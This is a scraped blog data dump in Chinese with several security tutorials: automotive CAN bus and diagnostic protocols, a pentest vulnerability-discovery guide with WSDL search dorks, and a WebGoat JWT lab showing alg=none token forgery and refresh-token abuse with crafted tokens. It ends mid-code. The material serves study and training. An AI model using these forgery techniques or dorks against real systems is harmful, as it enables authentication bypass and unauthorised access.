两根双绞线组成总线，要求总线两端端接。在终端两端的两根电线上有一个120欧姆的电阻。如果模块不在总线的末端，则不必担心终止。作为一个可能窃听线路的人，你唯一需要担心的是，如果你为了嗅探线路而拆除了终端设备。 工作原理 CAN总线的通信通过一种类似于“会议”的机制实现的，只不过会议的过程并不是由一方（节点）主导，而是每一个会议参加人员都可以自由的提出会议议题（多主通信模式）。 CAN总线的优点： 通信速率最高可达1MB/s（此时距离最长40m）。节点数实际可达110个。 采用短帧结构，每一帧的有效字节数为8个。 每帧信息都有CRC校验及其他检错措施，数据出错率极低。 通信介质可采用双绞线，同轴电缆和光导纤维，一般采用廉价的双绞线即可，无特殊要求。节点在错误严重的情况下，具有自动关闭总线的功能，切断它与总线的联系，以使总线上的其他操作不受影响。 OBD-II连接器找CAN总线 许多车辆配备了一个OBD-II连接器，也被称为诊断链路连接器（DLC），它与车辆的内部网络进行通信。你通常会发现这个连接器在转向柱下或隐藏在仪表盘的其他地方，在一个相对容易接近的地方。 在搜索电缆时很容易找到 CAN，因为它的静止电压为 2.5V。当信号进来时，它会增加或减少 1V（3.5V 或 1.5V）。 CAN 线贯穿车辆并连接 ECU 和其他传感器，它们始终采用双线对。如果连接万用表并检查车辆中的电线电压，您会发现它们将静止在 2.5V 或波动 1V。如果您发现一根电线以 2.5V 电压传输，几乎可以肯定是 CAN。 在图中，6号和14号引脚用于标准的高速CAN线（HS-CAN）。中速和低速通信发生在其他引脚上。一些汽车使用CAN的中速（MS-CAN）和低速（LS-CAN），但许多车辆对这些通信使用不同的协议。你会发现，并非所有的总线都通过OBD-II连接器暴露出来。你可以使用接线图来帮助定位额外的 &quot;内部 &quot;总线线路。 CAN数据包组成 标准 每个CAN总线数据包包含四个关键元素： 仲裁ID：仲裁ID是一个广播信息，用于识别试图进行通信的设备的ID，尽管任何一个设备可以发送多个仲裁ID。如果两个CAN数据包同时沿总线发送，则仲裁ID较低的数据包获胜。 标识符扩展（IDE）：对于标准的CAN，该位总是0。 数据长度代码（DLC）：这是数据的大小，范围从0到8字节。 数据：这就是数据本身。一个标准的CAN总线数据包所携带的数据的最大尺寸可以达到8字节，但有些系统通过填充数据包来强制要求8字节。 拓展 扩展数据包与标准数据包一样，只是它们可以被串联起来以创建更长的ID。扩展数据包被设计成适合于标准的CAN格式，以保持向后的兼容性。因此，如果一个传感器不支持扩展数据包，那么如果另一个数据包在同一网络上传输扩展的CAN数据包，它就不会中断。 标准数据包在使用标志方面也与扩展数据包不同。当查看网络转储中的扩展数据包时，你会发现与标准数据包不同，扩展数据包使用替代远程请求（SRR）来代替远程传输请求（RTR），并将SSR设置为1。 他们也会将IDE设置为1，而且他们的数据包会有一个18位的标识符，这是标准11位标识符的第二部分。还有一些特定于某些制造商的CAN风格的协议，它们也是向后兼容标准CAN的，与扩展CAN的方式基本相同。 因为CAN总线数据包是广播的，所以同一网络上的所有控制器都能看到每个数据包，有点像以太网上的UDP。包集不携带有关哪个控制器(或攻击者)发送了什么的信息。因为任何设备都可以看到和传输数据包，所以总线上的任何设备都可以模拟任何其他设备。 CAN数据包标准 ISO-TP（ISO 15765-5） 此标准的主要作用在 诊断+KWP消息（CAN的一种替代协议），当然也可以在发送大量数据包的时候使用 。接受拓展CAN数据包。 为了将ISO TP封装进CAN，将CAN数据字段首字节用于扩展寻址，所以只剩下7个字节用于传输数据本身。通过ISO TP发送大量信息容易引起泛洪，因此在繁忙的总线上传输信息需要小心。 CANopen CANopen是一种架构在控制局域网络控制局域网络（Controller Area Network, CAN）上的高层通信协议，包括通信子协议及设备子协议，常在嵌入式系统中使用，也是工业控制常用到的一种现场总线。 该协议是CAN协议的另一种扩展协议。其特点如下： 数据包构造改变 通信是有大量总裁ID为：0x0 11位标识符分解为：4个功能码+7位节点ID 仲裁ID附近有一个确定的结构，例如心跳协议的消息格式：0x700 + 节点ID 心跳协议（Heartbeat protocol）是用来监控网络中的节点及确认其正常工作。心跳信息的生产者（一般是 slave 设备）周期性的送出功能码 1110、ID 为本身节点 ID 的讯息，信息的数据部分有一个表示节点状态的位。而心跳信息的消费者负责接收上述数据，若在指定时间（于设备的对象字典中定义）内，消费者均未收到信息，可采取相应动作（例如显示错误或重置该设备）。 GMLAN总线 是汽车中CAN总线的实现。基于ISO-TP，与UDS协议（统一诊断服务）类似。 组成：一条低速+两条高速 低速：33.33Kbps+32节点 高速：500Kbps+16节点 SAE J1850协议（PWM VPM） 特点就是老旧，很少用了，简单介绍一下。 两种类型+3中速率（ABC）： PWM脉宽调制 引脚2和10运行差分信号，5V高电压，双线差分信号 1为高信号，0为低 VPM可变脉冲调制 引脚2，单线总线，7V高电压 数据包格式： PPP：优先级，111最低 H：起始字节大小，0为3字节，1为单字节 K：帧内响应，0为需求，1为不允许 Y：寻址模式，0为功能，1为物理 ZZ：消息类型 帧内响应（IFR）数据会紧跟VPM后面，有EOD/EOF信号作为结束 关键字协议（KWP2000）与ISO 9141-2 KWP使用引脚7，消息最多包含255字节，有两个变种（主要在初始化）： ISO 14230-4 KWP（5波特的初始化） ISO 14230-4 KMP（快速初始化） ISO 9141-2或K-Line是KWP的变种，使用引脚7，14为备选。 局域互联网协议（LIN） 作为CAN的补充，成本最低。特点如下： 没有仲裁码/优先级代码，由单独主节点负责传输 最多支持16个从节点，监听主节点并实时响应。而主节点连接CAN 工作在12V电压的单线总线，不接入OBD 帧格式如下，Header由主节点发送，其余主/从节点都可发送 注： ID表示消息类型，有64种可能性，ID60与ID64为诊断信息。当读取诊断信息时，8字节用于诊断，第一个字节被称为诊断节点地址（NAD）。字节的前部分为ISO标准定义，后半部分为厂商设备独有。 面向媒体的系统传输（MOST） 使用与媒体设备，其特点在于： 环形拓扑/虚拟星拓扑，有MOST设备作为定时的主设备，连续发送数据帧，最多支持64个MOST设备。 除了主设备，其他都有分配地址，支持即插即用 MOST分为三种速率：MOST25 / 50 / 150。使用的材料不同，定位不同。 MOST 总线利用光脉冲传输数据，采用环形结构，在环形总线内只能朝着一个方向传输数据 每个MOST帧有三个通道： 同步域：流数据（音/视频） 异步域：分组数据（TCP/IP） 控制域：控制和低速数据（HMI） MOST网络层 破解MOST 可以通过一个支持该协议的设备，如IVI或者车载MOST控制器进行破解。工具为：most4linux，可以： most_aplay播放wav文件 ctrl_tx 发送一条广播控制消息并检查其状态 sync_tx 实时传输 sync_rx 实时接收 FlexRay 是一种高速总线，传输速率高达10Mpbs，用于时间敏感的通信，例如线控驱动、线控转向、线控啥车。其实现成本高于CAN。所以FlexRay高端，CAN中端，LIN低端。 与CAN类似，为总线型拓扑结构，也与以太网类似，支持星型拓扑结构。专为车内联网设计，采用基于时间触发机制 FlexRay总线工作原理：FlexRay总线数据收发采取时间触发和事件触发的方式。 利用时间触发通信时，网络中的各个节点都预先知道彼此将要进行通信的时间， 接收器提前知道报文到达的时间，报文在总线上的时间可以预测出来。 它采用了周期通信的方式，一个通信周期可以划分为静态部分、动态部分、特征窗和网络空闲时间4个部分。 静态部分和动态部分用来传输总线数据，即FlexRay报文。 特征窗用来发送唤醒特征符和媒介访问检测特征符。网络空闲时间用来实现分布式的时钟同步和节点参数的初始化。 汽车以太网 正在逐步替代上述协议，为了能够让车联网真正地适配。例如CAN可以封装成UDP包。 OBD-II连接引脚图 诊断服务（UDS OBD KWP） ISO 14230的OBD七层模型和ISO 14229的增强型诊断七层模型 增强型诊断： 首先，OBD（汽车排放和驱动性相关）和增强型诊断（面向整车所有ECU）都属于系统级，拥有完整的七层模型。 其次，USD作为服务，处于模型的应用层和会话层。 而KWP2000作为汽车专用协议，处于模型的第4层至第1层。 另外，CAN因为使用较广泛，关于汽车的ISO 15765处于第4层至第3层。而通用的底层协议ISO 11898处于第2层至第1层。 所以，我们可以理解为OBD系统调用了UDS、KWP2000、CAN这些协议。而这些协议也能够被别的系统调用，组成新的七层模型。 OBD通过服务号（SID）调用相关UDS的服务，然后UDS根据应用的底层（K-Line、CAN-bus等）调用KWP2000或CAN。 即： OBD作为系统，自上而下，标准庞大而清晰。 UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。 OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。 UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。 总结 CAN总线是中坚，LIN总线是CAN总线的副手，FlexRay总线是未来的希望，MOST总线则负责车载多媒体业务。而随着车辆ECU的增多，车辆网络拓扑结构也越来越负责，比如说一辆车需要有多种总线（CAN总线，LIN，以太网，FlexRay）","categories":[{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"协议","slug":"协议","permalink":"https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"}]},{"title":"漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全","slug":"漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全","date":"2023-06-08T06:00:59.000Z","updated":"2023-06-08T06:00:59.000Z","comments":true,"path":"articles/2023/06/08/漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/","excerpt":"","text":"概述 为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp 漏洞类型&amp;危害条件？知道危害条件就可以先做好准备，例如得到低权限shell等等，看他是权限提升漏洞还是什么漏洞，就可以方便我们达成目标 如何做好未卜先知？做好信息搜集 此部分包含四个部分：如下 操作系统 一般都通过指纹来识别操作系统，还有一个特别古早的方法：Linux分大小写但是Windows不分 WEB应用 其实都差不多的思路，首先去找公开漏洞，不行就自己审计。 已知 CMS 如常见的 dedecms，discuz，wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要 利用公开的漏洞进行测试 如不存在可自行搭建环境，采用白盒代码审计自行挖掘。 开发框架 如常见的 thinkphp，spring，flask 等开发的源码程序，这种源码程序正常的安全测试思路： 先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试 如不存在可采用白盒代码审计自行挖掘 未知 CMS 如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测试思路： 能识别二次开发就按已知CMS 思路进行 不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜） 同样在有源码的情况下也可以进行代码审计自行挖掘 APP应用 一般来说，做了适应性的app都可以使用类似于web渗透的方法进行攻击，除非是采用特定的框架，采用非适应性（也就是用web浏览器打开不太行，不能做到适配，例如以此为开头的一般都是适应性的：m.xxx.com） API接口服务安全 分清api接口的类别，一般xml就是web service，而json就是restful。尽量找到wsdl的配置文件，看入口函数以及参数定义，这样子就能够构造数据包（使用postman也行，使用soapui啥的也行），构造完之后就是正常的渗透测试流程了，不太一样就是把这个包的参数都要自己摸索传输，而web传输我们抓包可以模仿一下~ 操作系统漏洞发现 学会使用一些工具：Nessus、Nmap、Goby。通过扫描的结果。 判断操作系统信息，版本、类型等 判断操作系统开放端口 查找历史漏洞，冲就完事了 WEB应用漏洞发现 识别WEB应用 看上面是分三类，所以主要是如何去测定这个是什么CMS或者是什么框架开发的。这个测定方法一般有： 手工 查看数据包。 查看头/源码，头里面可能会有特征值 http头。查看http响应报头的X-Powered-By字段来识别，可以通过netcat来识别，使用netcat 127.0.0.1 80对127.0.0.1主机的80端口web服务器框架进行识别。 Cookies。一些框架有固定的Cookies名称，这些名称一般情况都不会更改，例如zope3、cakephp、kohanasesson、laravel_session。 Html源代码。html源代码中包含注释、js、css等信息，通过访问这些信息来判断和确认cms系统框架。在源代码中常常会包含powered by、bulit upon、running等特征。 查看请求地址URL，请求地址目录有特征值 wp-content那就是wordpress的 特殊文件和文件夹 查看特殊文件（计算md5） robots.txt文件（例如dedecms的） favicon.ico、css、logo.ico、js等文件的md5 比对网站类型，通过收集CMS公开代码中的独有文件，这些文件一般轻易不会更改，通过爬虫对这些文件进行抓取并比对md5值，如果一样，则认为该系统匹配 查看端口：对于端口服务类，详细见下文 工具 whatweb wapplyze whatruns 参考：https://blog.51cto.com/simeon/2115190 整一个实战流程 首先识别一下这个网站是什么cms【即上面所说的】 看到了robots.txt，那么就直接往whatweb一搜就好，知道是什么cms之后就去查一下版本 知道CMS信息就去查历史漏洞，好像没有可以用的历史漏洞，那就看看后台地址是啥，看能不能爆破啥的 但是这个后台地址已经改掉了 就去查端口，看有什么应用，对应的漏洞 发现888、8888端口，那应该是宝塔waf应用，所以就去看看这个漏洞是啥 有一个漏洞 啥都没了，那就看看信息/代码泄露，去查看有什么配置信息，可以去看数据库有什么密码之类的 看到密码，直接登录，OK APP应用漏洞发现 反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！ APP-&gt;WEB APP-&gt;其他 APP-&gt;逆向 WEB 抓包，其他协议抓包演示及说明 未逆向层面进行抓包区分各协议测试 逆向层面进行提取 APK 代码层面数据 参考： https://www.cnblogs.com/L0ading/p/12388928.html 所以渗透主要是：对URL进行抓取，对URL进行协议分类，然后分别进行攻击。可以使用web类攻击，也可以使用其他。 URL提取 Burp 然后搜索一下（showall）关键字，像id之类的。 需要注意的是： 由于这些app的链接都能在 电脑 上访问，但是访问之后的**请求数据包不一样！**所以，你需要在测试的时候先抓一个安卓数据包，然后在测试的时候（例如xray）改一下http头部。 如果你不用burp，可以在手机端安装：抓包精灵。跟burp的抓包功能差不多。但是功能不好用，不是什么数据都抓。 Apk Analyser 直接把APK放进去扫就行。 xray/awvs+burp联动扫描 设置如下： 手机端的wifi模块高级设置，设置代理转发到192.168.???.???的端口8888 burp设置代理捕获端口8888，然后设置转发端口6666 xray设置代理端口为6666，开启webscan： 1.\\xray.exe webscan --listen 127.0.0.1:6666 利用 上工具/自己按照web的方法使用 API接口服务漏洞发现 API接口渗透测试是通过用渗透测试的方法测试系统组件间接口的一种测试。接口渗透测试主要用于检测外部系统与系统之间以及内部各个子系统之间的交互点。测试的重点是要检查数据的交换，传递和控制管理过程，以及系统间的相互逻辑依赖关系等。 参考： https://blog.csdn.net/dzqxwzoe/article/details/129221428 https://xz.aliyun.com/t/2412 https://blog.gm7.org/个人知识库/01.渗透测试/03.思路技巧/03.api接口测试#接口文档的作用 漏洞挖掘关注点 信息搜集 在 API 渗透中，除了常规的域名、端口、服务器 banner 之类的信息外，API 本身所特有的信息在信息收集时需要关注。举例如下。 API 是否存在接口定义规范描述文件？【判断接口类型】如果存在，遵循的规范是什么？SOAP、Open API 2.0、Open API 3.0 还是 Graph QL？ API 是依赖什么语言实现的？Java、.NET、PHP、Python、Go 还是其他语言？【构造payload需要用到】 API 运行所依赖的组件是什么版本，是否存在已知漏洞？ 互联网上是否存在其泄露的 API Key 或证书？ API 是否存在多个版本？多个接入端？ 还有就是，需要提供两个信息：【最重要】 API地址 接口文档 其他的按需要求客户提供，比如接口示例、认证token、sign校验算法等 手工测试 在 API 渗透测试中，手工挖掘往往占有较大的比重。当采用手工挖掘时，以下事项是需要重点关注的。 认证和授权：对于 API 的认证鉴权机制，设计人员和研发人员往往认识不足，有的 API 调用甚至缺少认证与授权机制。比如令牌、HTTP 方法（GET，POST，PUT 和 DELETE 等）在进入服务器之前是否都经过了验证，OAuth 协议使用的正确性，无认证和授权的 API 是否可以任意调用。 输入验证：和其他类型的应用程序一样，对于输入的不可信是应用程序安全的基础，但研发人员常常因疏忽导致对输入缺少有效的验证。比如 XML 实体注入类型的攻击、不同的响应类型 application/json 与 application/xml。 数据编码：包含 JSON 格式的数据，容易导致反序列化漏洞或远程代码执行。 API 版本和影子 API：同一个 API 的不同版本或未在 API 规范文件中描述的 API，更容易发现安全漏洞。 测试接口类型： Webservice接口：走soap协议，请求报文和返回报文都是xml格式 HTTP API接口（常规客户）：走HTTP协议，通过路径来区分调用的方法，以RESTful风格为主，请求报文入参有多种形式，返回报文一般为json串，最常见的是get和post方法 接口测试分为web service和API接口测试,WebSocket接口等测试。可以使用该网址进行发包啥的：https://v7.apipost.cn/apis#/apis/run WebService Web Service服务也是一些包装过的接口而已，针对Web Service服务的渗透测试和对常规API渗透测试是一样的、只是，可以使用安全工具来辅助进行： 12345678910111213WebScarapSoapUIWCFStormSOA CleanerWSDiggerwsScannerWfuzzRESTClientBurpSuiteWS-AttackerZAPMetasploitWSDL Analyze SoapUI NG Pro作为Web Service的测试工具，Burp作为代理、监听SoapUI NG Pro用自己构造的payload报文打Web Service的流量报文，其中可以篡改对应的报文参数实现渗透测试。 可以查找： 1234567891011121314151617181920inurl:jws?wsdlinurl:asmx?wsdlinurl:aspx?wsdlinurl:ascx?wsdlinurl:ashx?wsdlinurl:dll?wsdlinurl:exe?wsdlinurl:php?wsdlinurl:pl?wsdlinurl:?wsdlfiletype:jwsfiletype:asmxfiletype:ascxfiletype:aspxfiletype:ashxfiletype:dllfiletype:exefiletype:phpfiletype:plfiletype:wsdl 测试手法 在得到api之后，有这个思路可以参考挖掘： 观察接口命名，采用驼峰命名法，是否存在其他不在接口文档的类似的测试接口，比如getUserInfos、getUserInfoByUid等 这个地方虽然参数是phone，那会不会后端模糊查询输入用户名也可以查询呢 查询任意用户信息的接口，应该存在鉴权机制 未授权访问 针对普通用户，每个人只能查询自己的信息 手机号进入后端查询用户的信息，肯定会进行数据库查询 是否可以模糊查询，比如1388888% 是否存在SQL注入 参数置空、过长或者输入特殊字符，会不会导致数据库报错抛出异常，获取一些敏感信息 补充知识点（信息的最大化） 前置知识：使用IP访问和使用域名访问有什么区别？ 假设：有域名abc.com对应域名123.123.123.123，其建立的文件夹目录为：d:\\www\\j3fffff\\ 使用域名访问则会访问目录：d:\\www\\j3fffff\\ 使用IP访问则会访问目录：d:\\www\\ 所以如果有文件：d:\\www\\old.zip，那么使用IP地址可以访问，而使用域名就不行。 IP 端口 web 在如BurpSuite这种代理工具中设定的过滤规则来筛选Web Service请求。比如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”、“.php?wsdl”等 域名 web 子域名搜集，搜集的站点越多，目标越多，机会越多，可能越多！ 子域名搜集不仅仅局限于（子域名挖掘机）： 123www.jmlsd.combbs.jmlsd.comold.jmlsd.com 还可以 换后缀 看他以前有没有注册过这些域名（可以去https://www.west.cn/services/domain/看看有没有被注册），如果有，那么可能是同一家的，**并且挂载了老的系统或者其他业务**（可能是有漏洞的）： 1234www.jmlsd.com.cnwww.jmlsd.cnwww.jmlsd.netwww.jmlsd.org 还可以通过注册人反查他注册了什么公司 还可以通过特有信息，例如网站上写着：键美乐 ，那就查这个，可能会有其他域名： 1www.jmljy.com.cn 这个跟上面的是不一样的，他是“家园”，而不是“时代”。但是是一家公司的！","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"漏洞发现","slug":"漏洞发现","permalink":"https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"}]},{"title":"JAVA常见漏洞与代码审计基础","slug":"JAVA常见漏洞与代码审计基础","date":"2023-06-08T05:50:18.000Z","updated":"2023-06-08T05:50:18.000Z","comments":true,"path":"articles/2023/06/08/JAVA常见漏洞与代码审计基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/","excerpt":"","text":"概述 这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如何去操作，原理是怎么样的。进而，我们可以知道如何去审计一个系统。 这里已经默认安装了很多工具，不再一一讲。 此篇章将融合webgoat的代码审计、安全狗《JAVA代码审计（入门篇）》以及奇安信《网络安全：Java代码审计实战》整理而出。 注入漏洞类","categories":[{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"审计技巧","slug":"审计技巧","permalink":"https://j3f5.github.io/tags/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"}]},{"title":"JWT安全","slug":"JWT安全","date":"2023-06-07T06:14:47.000Z","updated":"2023-06-08T06:14:47.000Z","comments":true,"path":"articles/2023/06/07/JWT安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/07/JWT%E5%AE%89%E5%85%A8/","excerpt":"","text":"JWT概念 JSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。是一种认证授权机制。 组成部分 上面是使用base64编码的。头部和声明 部分都由JSON对象表示。头部 描述了应用于JWT的加密操作，以及JWT的附加属性，可以选择。声明代表一个JSON对象，其成员是JWT所传达的声明。 我们可以使用这个工具来解密：https://jwt.io/ 头部 Header 1234&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125; alg 是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256表示 HMAC SHA256。 typ 说明这个 token 的类型为 JWT 声明 Claims 令牌包含识别用户的要求，以及服务器满足请求所需的所有其他信息。请注意不要在令牌中存储敏感信息，并始终通过安全通道发送。例如解码得到： 1234567891011121314&#123;&quot;exp&quot;: 1416471934,&quot;user_name&quot;: &quot;user&quot;,&quot;scope&quot;: [&quot;read&quot;,&quot;write&quot;],&quot;authorities&quot;: [&quot;ROLE_ADMIN&quot;,&quot;ROLE_USER&quot;],&quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,&quot;client_id&quot;: &quot;my-client-with-secret&quot;&#125; JWT 固定参数有： iss：发行人 exp：到期时间 sub：主题 aud：用户 nbf：在此之前不可用 iat：发布时间 jti：JWT ID 用于标识该 JWT 签名 Signature 每个JWT令牌在发送给客户端之前至少应该被签名，如果一个令牌没有被签名，客户端应用程序将能够改变令牌的内容。签名规范在这里定义，你可以使用的具体算法在这里描述。基本上，你使用 HMAC与SHA-2函数 数字签名与RSASSA-PKCS1-v1_5/ECDSA/RSASSA-PSS 函数 来签名令牌。在执行任何其他操作之前验证签名是一个重要的步骤。【需要密钥！】 认证与获取JWT令牌 在这个流程中，你可以看到 用户用一个用户名和密码登录，认证成功后，服务器会返回。 服务器创建一个新的令牌并将这个令牌返回给客户端。 当客户端连续调用服务器时，它在 &quot;授权 &quot;头中附加了新的令牌。 服务器读取令牌并首先验证签名，验证成功后，服务器使用令牌中的信息来识别用户。 分类访问(Access)令牌与刷新(Refresh)令牌 通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行 API 调用。访问令牌的生命周期有限，这就是刷新令牌的用武之地。一旦访问令牌不再有效，就可以向服务器发出请求，以通过出示刷新令牌来获取新的访问令牌。刷新令牌可以过期，但它们的寿命要长得多。 这解决了用户必须使用其凭据再次进行身份验证的问题。您是否应该使用刷新令牌和访问令牌取决于以下几点，在选择要使用的令牌时要牢记以下几点。 登录获取令牌：curl -X POST -H -d 'username=webgoat&amp;password=webgoat' localhost:8080/WebGoat/login 服务器返回令牌： 123456&#123; &quot;token_type&quot;:&quot;bearer&quot;, &quot;access_token&quot;:&quot;XXXX.YYYY.ZZZZ&quot;, &quot;expires_in&quot;:10, &quot;refresh_token&quot;:&quot;4a9a0b1eac1a34201b3c5659944e8b7&quot;&#125; 如您所见，刷新令牌是一个随机字符串，服务器可以对其进行跟踪（在内存中或存储在数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端设置用户会话没有负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌以确保令牌未以任何方式被阻止。 每当攻击者获得访问令牌时，它仅在一定时间内有效（比如 10 分钟）。然后攻击者需要刷新令牌来获取新的访问令牌。这就是刷新令牌需要更好保护的原因。也可以使刷新令牌无状态，但这意味着将更难查看用户是否撤销了令牌。服务器完成所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。客户端可以使用新的访问令牌进行 API 调用。 无论选择哪种解决方案，您都应该在服务器端存储足够的信息以验证用户是否仍然可信。 存储 ip 地址 跟踪使用刷新令牌的次数（在访问令牌的有效时间窗口内多次使用刷新令牌可能表示奇怪的行为，你可以撤销所有令牌并让用户再次进行身份验证） 跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能能够使用攻击者的刷新令牌为不同的用户获取新的访问令牌（参见 https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ 以获得关于此攻击如何工作的精彩文章） 检查用户的 IP 地址或地理位置。如果您需要发出新的令牌，请检查位置是否仍然相同，如果不撤销所有令牌并让用户再次进行身份验证。 JWT的用处 在现代单页应用程序 (SPA) 中使用刷新令牌是否有意义？正如我们在关于存储令牌的部分中看到的那样，有两种选择： Web 存储 cookie 这意味着刷新令牌就在访问令牌旁边，因此如果访问令牌泄露，刷新令牌也可能会受到损害。大多数时候当然是有区别的。 访问令牌在您进行 API 调用时发送，刷新令牌仅在应获取新访问令牌时发送，这在大多数情况下是不同的端点。如果您最终在同一台服务器上，您可以选择仅使用访问令牌。 如上所述，使用访问令牌和单独的刷新令牌为服务器提供了一些杠杆，而不是一遍又一遍地检查访问令牌。仅在用户需要新的访问令牌时执行检查。当然可以只使用访问令牌。在服务器上，您存储的信息与您为刷新令牌存储的信息完全相同，请参阅上一段。这样您每次都需要检查令牌，但这可能适用于不同的应用程序。在存储刷新令牌以进行验证的情况下，保护这些令牌也很重要（至少使用哈希函数将它们存储在数据库中）。 有很多可用资源质疑使用 JWT 令牌进行客户端到服务器身份验证的用例。使用 JWT 令牌的最佳位置是服务器到服务器之间的通信。在普通的 Web 应用程序中，您最好使用普通的旧 cookie。 伪造签名令牌 伪造access_token攻击 截获数据包，发现 发现里面有个字段为：admin=false，改成true试试看。但是返回一个：token不正确，要检查。所以可能是签名出问题了，我们改了参数值，同步的签名也要进行更改的，但是我们没有密钥，所以后面的签名没办法更改。我们可以尝试更改头部，让它不用密钥加密就好啦，直接 none 走起！操作如下： 1234&#123;&quot;alg&quot;:&quot;none&quot;&#125;eyJhbGciOiJub25lIn0=&#123;&quot;iat&quot;:1686989890,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ== 但是在HTTP数据传输的过程中，Base64编码中的=+/等特殊的符号通过URL容易产生歧义，所以产生了与URL兼容的Base64 URL编码，所以把=删掉，就构造好了：eyJhbGciOiJub25lIn0.eyJpYXQiOjE2ODY5ODk4OTAsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ. 伪造authorization 这个的伪造点在字段：Authorization中。 1234567POST /WebGoat/JWT/refresh/checkout HTTP/1.1Host: 127.0.0.1:8080Content-Length: 0sec-ch-ua: &quot;Chromium&quot;;v=&quot;112&quot;, &quot;Google Chrome&quot;;v=&quot;112&quot;, &quot;Not:A-Brand&quot;;v=&quot;99&quot;sec-ch-ua-mobile: ?0Authorization: Bearer null... 我们有一个JWT token： 1eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q 第一种：更改时间 &amp;&amp; alg=none 分析得到这个token早就过期了，那么我们重新弄一下这个过期时间，然后把签名去掉。参考上面的。 1eyJhbGciOiJub25lIn0.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6IDE2ODYyOTAzMTgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ. 第二种：使用refresh token 通常，在响应 JWT 身份验证/刷新请求时，你会得到如下所示的内容： 1&#123;&quot;code&quot;:0,&quot;data&quot;:&#123;&quot;access_token&quot;:&quot;XXX.YYY.ZZZ&quot;,&quot;access_token_expiration&quot;:&quot;Thursday, November 9th, 2017, 10:27:33 PM&quot;,&quot;refresh_token&quot;:&quot;ABC123&quot;&#125;&#125; 此示例中的访问令牌将于10:27:33过期。通常，应用程序将使用刷新令牌在到期日期之前刷新/获取新的访问令牌。该请求将转到授权服务器，如下所示： 123456POST /auth/refresh HTTP/1.1Host: auth.example.comContent-Type: application/jsonAuthorization: Bearer XXX.YYY.ZZZ&#123;&quot;refresh_token&quot;:&quot;ABC123&quot;&#125; 当前访问令牌位于授权标头中，刷新令牌位于 POST 正文中。作为回报，您将获得一个全新的访问令牌、到期日期和刷新令牌。则我们伪造：使用我的刷新令牌刷新其他人的访问令牌 操作如下： F12查看流量，搜索：refresh_token，得到： 获取这个refresh_token，还有之前tom的token，抓包贴上（改URL，改content-type…），如下，就可刷新我们的token了，我们的token就不怕过期了！（得到URL的方式也很重要） 贴上我们刚获得的token，就OK了！ 代码审计 更改token细节——匹配 对比下面两个代码： 12345678910111213try &#123; Jwt jwt = 